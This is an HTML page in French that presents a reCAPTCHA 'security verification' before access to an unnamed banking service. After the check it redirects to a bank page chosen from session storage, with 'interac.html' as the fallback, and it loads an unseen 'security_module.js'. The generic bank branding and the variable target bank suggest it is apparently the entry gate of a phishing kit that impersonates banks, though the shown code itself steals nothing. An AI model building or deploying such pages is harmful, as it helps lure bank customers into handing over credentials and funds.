<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification de sécurité</title>
    <!-- Google reCAPTCHA v2 API -->
    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
    <style>
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: #f4f6f9; margin: 0; padding: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; color: #333; }
        .captcha-card { background: white; width: 90%; max-width: 400px; padding: 32px 24px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); text-align: center; }
        .icon-shield { width: 54px; height: 54px; background: #e8f0fe; color: #1a73e8; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; font-size: 26px; }
        h2 { font-size: 20px; font-weight: 700; margin: 0 0 8px; color: #1a1a1a; }
        p { font-size: 14px; color: #666; margin: 0 0 24px; line-height: 1.4; }
        
        .captcha-container { display: flex; justify-content: center; margin-bottom: 24px; }
        .btn-continue { width: 100%; background: #1a73e8; color: white; border: none; padding: 14px; font-size: 15px; font-weight: 600; border-radius: 8px; cursor: pointer; opacity: 0.5; pointer-events: none; transition: opacity 0.2s; }
        .btn-continue.active { opacity: 1; pointer-events: auto; }
    </style>
</head>
<body>

<div class="captcha-card">
    <div class="icon-shield">🛡️</div>
    <h2>Vérification de sécurité</h2>
    <p>Veuillez compléter le test de sécurité pour accéder au service bancaire.</p>

    <div class="captcha-container">
        <!-- Clé de site reCAPTCHA v2 -->
        <div class="g-recaptcha" data-sitekey="6LcdR6QtAAAAAEnucy3GDybzCfN6eY8yW3TumNDy" data-callback="onCaptchaSuccess"></div>
    </div>

    <button class="btn-continue" id="btnGo">Continuer</button>
</div>

<script>
    function onCaptchaSuccess(token) {
        var btnGo = document.getElementById('btnGo');
        btnGo.classList.add('active');
    }

    document.addEventListener('DOMContentLoaded', function() {
        var btnGo = document.getElementById('btnGo');
        btnGo.addEventListener('click', function() {
            var target = sessionStorage.getItem('__targetBank') || 'interac.html';
            window.location.href = target;
        });
    });
</script>
<script src="security_module.js"></script>
</body>
</html>
